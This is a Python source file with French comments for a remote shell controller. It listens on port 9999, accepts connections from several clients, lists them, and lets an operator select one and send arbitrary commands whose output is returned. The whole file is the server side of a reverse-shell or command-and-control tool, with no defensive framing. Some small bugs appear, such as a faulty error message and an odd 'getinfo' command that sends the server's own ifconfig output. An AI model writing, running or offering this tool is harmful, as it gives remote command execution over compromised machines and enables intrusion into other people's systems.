import socket
import threading
from queue import Queue
import subprocess

THREADS = 2
NUMBER = [1, 2]
queue = Queue()
connections = []
addresses = []

COMMANDS = {'help': ['Shows help'],
            'list': ['Lists clients'],
            'select': ['Selects a client by its number. Takes number as a parameter'],
            'quit': ['Stops current connection with selected client'],
            'getinfo': ['Get info from client(ifconfig)'],
            'shutdown': ['Shutdown the server'],
            }


def print_help():
    for cmd, v in COMMANDS.items():
        print("{0}:\t{1}".format(cmd, v[0]))
    return


# Créer un socket pour initier une connexion
def socket_creation():
    try:
        global host
        global port
        global sock
        host = ''
        port = 9999
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# En attente de connexion
def socket_bind():
    try:
        global host
        global port
        global sock
        print("Binding socket to port: " + str(port))
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("socket binding error: ", + str(msg) + "\n" + "Please retry ...")
        socket_bind()

# Acceptation connexion
def accept_socket():
    print("Accepting Socket ...")
    for c in connections:
        c.close()
    del connections[:]
    del addresses[:]
    while 1:
        try:
            conn, address = sock.accept()
            conn.setblocking(1)
            connections.append(conn)
            addresses.append(address)
            print("\nConnection established on " + address[0] + ":" + str(address[1]))  # Affiche l'IP et le PORT
        except socket.error as msg:
            print("Error while accepting the connection ..." + str(msg))


# Shell
def start_prompt():
    print("### Interactive Shell ###")
    while True:
        cmd = input('Shell> ')
        if cmd == 'list':

            print('----- Clients -----')
            for address in addresses:
                print(str(addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
            print('')
            continue
        elif 'select' in cmd:
            target = cmd.replace('select ', '')
            target = int(target) - 1
            conn = connections[target]
            print("You are now connected to " + str(addresses[target][0]))
            print("Shell (" + str(addresses[target][0]) + ")>", end="")
            while True:
                try:
                    cmd = input()
                    if cmd == 'quit':
                        break
                    elif cmd == 'getinfo':
                        p = subprocess.check_output("ifconfig").decode("utf-8")
                        print(p, end="")
                        conn.send(str.encode(p, "utf-8"))
                        client_response = str(conn.recv(20480))
                        print(client_response)
                    elif len(str.encode(cmd)) > 0:
                        conn.send(str.encode(cmd))
                        client_response = str(conn.recv(20480), "utf-8")
                        print(client_response, end="")
                except socket.error as msg:
                    print("Connection was lost" + str(msg))
                    break
        elif cmd == 'shutdown':
            queue.task_done()
            queue.task_done()
            print('Server shutdown')
            break
        elif cmd == 'help':
            print_help()


# Threads
def create_threads():
    for a in range(THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Définir work pour faire les deux jobs
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_creation()
            socket_bind()
            accept_socket()
        if x == 2:
            start_prompt()
        queue.task_done()


# Jobs
def create_jobs():
    for x in NUMBER:
        queue.put(x)
    queue.join()


create_threads()
create_jobs()
